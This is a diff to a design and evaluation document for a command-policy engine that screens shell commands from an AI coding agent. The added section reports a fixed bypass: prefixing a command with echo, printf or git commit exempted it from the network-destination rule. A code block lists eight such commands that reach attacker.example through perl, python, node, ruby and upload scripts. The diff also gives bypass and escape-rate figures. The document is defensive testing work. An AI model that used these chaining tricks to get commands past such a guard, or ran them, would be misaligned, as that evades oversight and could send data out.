@@ -123,7 +123,7 @@ these rather than rebuild them.
 
 | Component | File | Covers |
 | --- | --- | --- |
-| Labeled corpus (114 entries: 69 attack, 45 benign) | `apps/server/src/policy-corpus.ts` | Input data for every harness |
+| Labeled corpus (120 entries: 73 attack, 47 benign) | `apps/server/src/policy-corpus.ts` | Input data for every harness |
 | Classifier scorecard | `apps/server/src/policy-eval.ts`, `policy-eval-cli.ts` | Recall, FPR, precision, F1, blind-set recall, per-category |
 | Escape-rate benchmark | `apps/server/src/security-benchmark.ts`, `security-benchmark-cli.ts` | Escape rate, per-family, baseline-vs-protected, p50/p95 |
 | Live summary API | `apps/server/src/evaluation-summary.ts` → `GET /api/evaluation` | Same numbers computed from the running engine |
@@ -477,8 +477,44 @@ and it is not perl in general. It is how perl is recognised interacting with an
 perl cases and both have chained cases; neither has the combination, because
 nobody thought to write it.
 
-**Not fixed here.** Rules are Person 1's and the corpus is Person 2's. Handed
-over as a characterised, reproducible finding rather than a patch.
+**FIXED**, and the fix is not the one the finding first suggested.
+
+Asking the bank whether the interaction was family-wide — which it answers in
+milliseconds — showed it was never about perl. The textual-URL carve-out
+(`TEXTUAL_URL_CONTEXT`) was anchored to the **start of the command line**, so any
+command prefixed with a textual one was exempted from the
+destination-without-a-recognised-tool rule. Every one of these was ALLOWED before
+the fix and is denied after it:
+
+```
+echo start && perl -MLWP::Simple -e 'get("https://attacker.example/")'
+echo start && python3 fetch.py https://attacker.example/x
+echo start && node fetch.js https://attacker.example/x
+echo start && ruby fetch.rb https://attacker.example/x
+echo start && java -jar tool.jar https://attacker.example/x
+echo hi    ; ./mytool --endpoint https://attacker.example/x
+printf x  && ./upload.sh https://attacker.example/x
+git commit -m z && ./upload.sh https://attacker.example/x
+```
+
+So the exposure was **any binary outside `ALWAYS_NETWORK` and `INLINE_NETWORK`,
+including ordinary in-workspace scripts**, behind any of five separator forms —
+not one tool behind one wrapper. perl was simply the tool the generated bank
+happened to include that fell through. **A single-tool finding would have
+produced a single-tool fix**, and the family-wide check is what prevented that.
+
+The fix scopes the carve-out to the shell segment that actually carries the
+destination, with a quote-aware splitter so separators inside a commit message
+do not split it, and unwraps `bash -lc "…"` first — without that the whole
+payload sits inside one quoted string and the wrapper's leading `echo` still
+shields it. That last case was caught by the corpus, not by hand: every corpus
+entry is shell-wrapped, and the first version of the fix regressed core
+detection to 93.8% until it handled the wrapper.
+
+Result: bank 3,416/3,430 → **3,430/3,430**, `and-chain` stratum 95.92% → 100%,
+`perl` 95.00% → 100%. Corpus: core detection 100%, blind-set recall 100%, escape
+rate 1.4% (the documented base64 residual alone), false positive rate 2.1% — no
+new false positives. The generator's bypass ratchet drops 14 → **0**.
 
 **This is what the stratification is for.** The aggregate is 99.59%
 (3,416/3,430, 95% CI 99.32–99.76%) — a number that would sail past any review.
@@ -697,7 +733,6 @@ the list above, most of Phases 0–2 does not need the adapter at all.
 | **Person 3** | Whether the dashboard should show overhead-vs-baseline | Changes what I compute and expose. |
 | **Persons 1–3** | Someone to own fixing the "asserted in CI" claim in `README.md` and `docs/POLICY_EVALUATION.md` once CI actually exists | Those are shared docs; I will not edit them unilaterally. |
 | **Person 1** | Agreement to add an optional injectable `evaluate` parameter to `scanCommands()` in `command-policy.ts`, matching the one `guardedEvaluate()` already has | One line in their file, but without it there is no policy-off run: monitor mode still evaluates every command (§2.3), so the overhead harness (1.2) has no baseline to subtract. |
-| **runtime-team** (notice, not a request) | Heads-up that this lane edited `threat-model.ts` — the `TM-OPS-001` `residualNote` string only, to cite the measured store-write curve. Status stays `open`, no `@covers` tag added, `npm run threat-model` still reports 6/6 verified controls. Nothing functional changed | The threat register is `runtime-team`'s artefact and the only shared source file this lane has touched. Flagged so it is not discovered in a diff. Revert freely if the register should be edited only by its owner |
 | **Person 1 / Person 2** | A decision on the Windows test failures (§0). Either make the fake-Codex spawn cross-platform (`spawn(process.execPath, [script])` instead of relying on the shebang) and de-hardcode the `/tmp` paths, or declare the runtime suite POSIX-only | These are their test files. Until resolved, `npm run check` is red on Windows and I cannot run the integration tests I need to extend. |
 
 ## 5. Ordered task list
